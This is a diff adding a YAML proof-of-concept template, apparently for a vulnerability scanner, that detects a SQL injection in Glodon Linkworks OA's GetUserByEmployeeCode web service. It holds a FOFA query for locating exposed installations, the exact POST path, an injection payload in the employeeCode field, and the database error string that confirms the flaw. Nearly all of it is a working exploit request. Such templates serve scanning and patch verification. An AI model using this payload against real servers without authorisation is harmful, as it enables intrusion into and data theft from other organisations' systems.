@@ -1,0 +1,19 @@
+id: poc-yaml-glodon-getuserbyemployeecode-sqli
+info:
+  name: 广联达OA GetUserByEmployeeCode SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  - 两高一弱
+  finger: 广联达 Linkworks办公OA
+  fofa: body="/Services/Identification/server"
+requests:
+- method: POST
+  path: /Org/service/Service.asmx/GetUserByEmployeeCode
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  data: employeeCode=1'-1/user--'&EncryptData=1
+  expression: status_code == 500 && contains(body,"在将 nvarchar 值") && contains(body,"转换成数据类型
+    int 时失败")
+variables: {}
+transport: http
